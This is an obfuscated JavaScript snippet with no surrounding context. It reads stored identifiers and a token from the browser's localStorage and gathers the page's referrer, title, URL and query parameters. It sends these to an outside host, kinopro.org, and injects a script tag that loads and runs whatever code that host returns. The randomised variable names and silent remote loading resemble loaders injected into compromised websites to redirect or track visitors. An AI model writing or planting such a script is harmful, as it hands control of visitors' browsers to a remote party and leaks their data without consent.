    (function() {
    var name = '_y5GxrZT37F8RR6kn';
    if (!window._y5GxrZT37F8RR6kn) {
        window._y5GxrZT37F8RR6kn = {
            unique: true,
            ttl: 86400,
            R_PATH: 'https://kinopro.org/XX6xjtNN',
            P_PATH: 'https://kinopro.org/19d4412/postback',
        };
    }
    const _bxfNzqtT3s5D4JVt = localStorage.getItem('config');
    if (typeof _bxfNzqtT3s5D4JVt !== 'undefined' && _bxfNzqtT3s5D4JVt !== null) {
        var _t7pGdJVQTtjbyrQs = JSON.parse(_bxfNzqtT3s5D4JVt);
        var _1By6t9dbrPYDZV6n = Math.round(+new Date()/1000);
        if (_t7pGdJVQTtjbyrQs.created_at + window._y5GxrZT37F8RR6kn.ttl < _1By6t9dbrPYDZV6n) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _35r1SCBXpDxg64xK = localStorage.getItem('subId');
    var _Nx73xHWSxYzVYFdc = localStorage.getItem('token');
    var _TgCK3kJVSkj5dfnZ = '?return=js.client';
        _TgCK3kJVSkj5dfnZ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _TgCK3kJVSkj5dfnZ += '&se_referrer=' + encodeURIComponent(document.referrer);
        _TgCK3kJVSkj5dfnZ += '&default_keyword=' + encodeURIComponent(document.title);
        _TgCK3kJVSkj5dfnZ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _TgCK3kJVSkj5dfnZ += '&name=' + encodeURIComponent(name);
    if (typeof _35r1SCBXpDxg64xK !== 'undefined' && _35r1SCBXpDxg64xK && window._y5GxrZT37F8RR6kn.unique) {
        _TgCK3kJVSkj5dfnZ += '&sub_id=' + encodeURIComponent(_35r1SCBXpDxg64xK);
    }
    if (typeof _Nx73xHWSxYzVYFdc !== 'undefined' && _Nx73xHWSxYzVYFdc && window._y5GxrZT37F8RR6kn.unique) {
        _TgCK3kJVSkj5dfnZ += '&token=' + encodeURIComponent(_Nx73xHWSxYzVYFdc);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._y5GxrZT37F8RR6kn.R_PATH + _TgCK3kJVSkj5dfnZ;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
